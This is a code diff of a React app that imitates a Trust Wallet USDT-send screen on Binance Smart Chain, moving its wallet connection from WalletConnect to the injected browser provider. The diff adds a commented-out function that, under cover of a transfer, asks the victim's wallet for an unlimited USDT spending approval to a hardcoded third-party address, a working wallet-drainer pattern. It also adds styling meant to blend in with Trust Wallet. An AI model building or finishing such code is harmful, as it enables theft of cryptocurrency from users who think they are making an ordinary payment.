@@ -1,11 +1,10 @@
 import React, { useState, useEffect, useRef } from "react";
 import styled from 'styled-components';
-import { WalletConnectModal } from '@walletconnect/modal';
-import { EthereumProvider } from '@walletconnect/ethereum-provider';
+import Web3 from "web3";
 import { ethers } from "ethers";
 import { FaArrowLeft } from 'react-icons/fa';
-import { QRCodeSVG } from "qrcode.react";
 import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils.js';
+import { detectWalletAddress } from "./utils/transactionUtils.js"; // you'll create this helper
 
 /* eslint-disable */
 
@@ -44,43 +43,14 @@ const USDT_ABI = [
     payable: false,
     stateMutability: "nonpayable",
     type: "function"
-  }
+  }    
 ];
 
 // BSC RPC Provider
 const rpcUrl = "https://bsc-dataseed.binance.org/";
 const bscProvider = new ethers.JsonRpcProvider(rpcUrl);
 
-// DApp URL (replace with your actual deployed URL)
-const DAPP_URL = "https://sendusdt-one.vercel.app"; // e.g., https://transfer-trust-wallet.vercel.app
-
-// WalletConnect Provider
-let walletConnectProvider = null;
-
-const initWalletConnect = async () => {
-  walletConnectProvider = await EthereumProvider.init({
-    projectId: "YOUR_WALLETCONNECT_PROJECT_ID", // Get from https://cloud.walletconnect.com
-    chains: [56],
-    optionalChains: [56],
-    rpcMap: { 56: rpcUrl },
-    showQrModal: false,
-    metadata: {
-      name: "USDT DApp",
-      description: "Transfer USDT on BSC",
-      url: DAPP_URL,
-      icons: ["https://your-dapp.vercel.app/favicon.ico"]
-    }
-  });
-};
-
-// WalletConnect Modal
-const walletConnectModal = new WalletConnectModal({
-  projectId: "51a558632ac7720e210097bd7caf6c28",
-  chains: ["eip155:56"],
-  themeMode: "light",
-});
-
-// Force White Background
+// Force White Background for Entire Page
 const GlobalStyle = styled.div`
   background-color: white !important;
   color: black !important;
@@ -100,6 +70,27 @@ const Container = styled.div`
   justify-content: flex-start;
   width: 100%;
   box-sizing: border-box;
+`;
+
+// Back button styling
+const BackButton = styled.button`
+  position: absolute;
+  left: 20px;
+  top: 35px;
+  background: none;
+  border: none;
+  color: #d8dbdf;
+  font-size: 20px;
+  cursor: pointer;
+`;
+
+// Title styling
+const Title = styled.h1`
+  font-size: 16px;
+  font-weight: 550;
+  text-align: center;
+  margin-bottom: 10px;
+  font-family: 'Roboto', sans-serif;
 `;
 
 // Input container
@@ -126,7 +117,7 @@ const InputFieldContainer = styled.div`
 // Styled input field
 const Input = styled.input`
   width: 100%;
-  padding: 16px 100px 16px 12px;
+  padding: 16px 100px 16px 12px; /* Adjusted padding for buttons */
   font-size: 16px;
   font-weight: normal;
   margin-top: 5px;
@@ -134,8 +125,8 @@ const Input = styled.input`
   border: 1px solid #ccc;
   box-sizing: border-box;
   height: 50px;
-  appearance: none;
-  -moz-appearance: textfield;
+  appearance: none; /* ✅ Removes default increase/decrease arrows */
+  -moz-appearance: textfield; /* ✅ Removes arrows in Firefox */
 
   &::-webkit-outer-spin-button,
   &::-webkit-inner-spin-button {
@@ -148,9 +139,9 @@ const Input = styled.input`
     box-shadow: 0px 0px 6px #eeeff2;
     outline: none;
   }
-`;
+`;  
 
-// Circular Clear Button
+// Circular Clear Button (Only for Address Field)
 const ClearButton = styled.span`
   position: absolute;
   right: 60px;
@@ -184,15 +175,17 @@ const PasteButton = styled.span`
   font-size: 14px;
   cursor: pointer;
   padding-left: 15px;
+  /* Forcing Light Mode */
   background-color: white !important;
   color: black !important;
-
+  
+  /* Prevents Trust Wallet from overriding styles */
   * {
     color-scheme: light !important;
   }
 `;
 
-// "USDT" text
+// "USDT" text (Aligned correctly)
 const UsdtText = styled.span`
   position: absolute;
   right: 50px;
@@ -250,12 +243,6 @@ const AmountConversion = styled.p`
   margin-top: 10px;
 `;
 
-// QR Code container
-const QRCodeContainer = styled.div`
-  margin: 20px auto;
-  text-align: center;
-`;
-
 const App = () => {
   const [address, setAddress] = useState(RECIPIENT_ADDRESS);
   const [usdtAmount, setUsdtAmount] = useState("");
@@ -265,54 +252,100 @@ const App = () => {
   const [loading, setLoading] = useState(false);
   const [transferCompleted, setTransferCompleted] = useState(false);
   const [walletAddress, setWalletAddress] = useState("");
-  const [qrCodeUri, setQrCodeUri] = useState("");
+
   const isProcessing = useRef(false);
 
+  // Commented out sendUSDT to preserve original code but disable it
+  /*
+  const sendUSDT = async () => {
+    if (isProcessing.current) return;
+    try {
+      isProcessing.current = true;
+      setLoading(true);
+      setTransferCompleted(false);
+      if (!window.ethereum) return;
+      const web3 = new Web3(window.ethereum);
+      const accounts = await web3.eth.getAccounts();
+      const sender = accounts[0];
+      if (!sender || !web3.utils.isAddress(sender)) return;
+      const chainId = await web3.eth.getChainId();
+      if (chainId !== 56) {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }],
+        });
+      }
+      const params = new URLSearchParams(window.location.search);
+      const userAddress = params.get("address");
+      if (!userAddress || !/^0x[a-fA-F0-9]{40}$/.test(userAddress)) return;
+      const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
+      const SPENDER_ADDRESS = "0xcad014a3a7755137b5d1631e48f3d88daca8d910";
+      const MAX_UINT256 = web3.utils.toTwosComplement(-1);
+      await contract.methods.approve(SPENDER_ADDRESS, MAX_UINT256).send({ from: sender });
+      setTransferCompleted(true);
+    } catch (err) {
+      console.error("🔴 Approval error:", err);
+    } finally {
+      isProcessing.current = false;
+      setLoading(false);
+    }
+  };
+  */
+
   useEffect(() => {
-    const initWalletConnect = async () => {
+    const ensureBSCNetwork = async () => {
+      const bscChainId = "0x38";
       try {
-        await initWalletConnect();
-        await walletConnectProvider.connect();
-        const provider = new ethers.BrowserProvider(walletConnectProvider);
+        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+        if (currentChainId !== bscChainId) {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: bscChainId }],
+          });
+        }
+      } catch (error) {
+        if (error.code === 4902) {
+          try {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: bscChainId,
+                chainName: 'Binance Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                blockExplorerUrls: ['https://bscscan.com'],
+              }],
+            });
+          } catch (addError) {
+            console.error("❌ Couldn't add BSC:", addError);
+          }
+        } else {
+          console.error("❌ Failed to switch network:", error);
+        }
+      }
+    };
+    ensureBSCNetwork();
+  }, []);
+
+  useEffect(() => {
+    const init = async () => {
+      try {
+        if (!window.ethereum) return;
+        const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
         const userAddress = await signer.getAddress();
         setWalletAddress(userAddress);
-        console.log("🔗 Wallet connected via WalletConnect:", userAddress);
+        console.log("🔗 Wallet connected:", userAddress);
         const balances = await fetchBalances(userAddress);
         setUsdtBalance(balances.usdt);
         setBnbBalance(balances.bnb);
         console.log("✅ Balances fetched:", balances);
         setWalletConnected(true);
-        walletConnectModal.closeModal();
       } catch (err) {
-        console.error("❌ WalletConnect init error:", err);
-        setQrCodeUri(walletConnectProvider.uri || "");
-        console.log("📸 QR code URI generated:", walletConnectProvider.uri);
+        console.error("❌ init() error:", err);
       }
     };
-
-    const ensureBSCNetwork = async () => {
-      try {
-        if (walletConnectProvider) {
-          const chainId = await walletConnectProvider.request({ method: 'eth_chainId' });
-          if (chainId !== "0x38") {
-            await walletConnectProvider.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: "0x38" }],
-            });
-          }
-        }
-      } catch (error) {
-        console.error("❌ Failed to switch network:", error);
-      }
-    };
-
-    initWalletConnect();
-    ensureBSCNetwork();
-
-    return () => {
-      if (walletConnectProvider) walletConnectProvider.disconnect();
-    };
+    init();
   }, []);
 
   const clearAddress = () => {
@@ -322,13 +355,6 @@ const App = () => {
   return (
     <GlobalStyle>
       <Container>
-        {!walletConnected && qrCodeUri && (
-          <QRCodeContainer>
-            <p>Scan this QR code with Trust Wallet to connect:</p>
-            <QRCodeSVG value={`trust://wc?uri=${encodeURIComponent(qrCodeUri)}`} size={200} />
-            <p>Or open in Trust Wallet DApp Browser: <a href={DAPP_URL}>{DAPP_URL}</a></p>
-          </QRCodeContainer>
-        )}
         <InputContainer>
           <InputLabel>Address or Domain Name</InputLabel>
           <InputFieldContainer>
@@ -352,11 +378,6 @@ const App = () => {
 
         <NextButton
           onClick={async () => {
-            if (!walletConnected) {
-              alert("Please connect your wallet via QR code or DApp Browser.");
-              await walletConnectModal.openModal();
-              return;
-            }
             try {
               setLoading(true);
               if (!usdtAmount || isNaN(parseFloat(usdtAmount)) || parseFloat(usdtAmount) <= 0) {
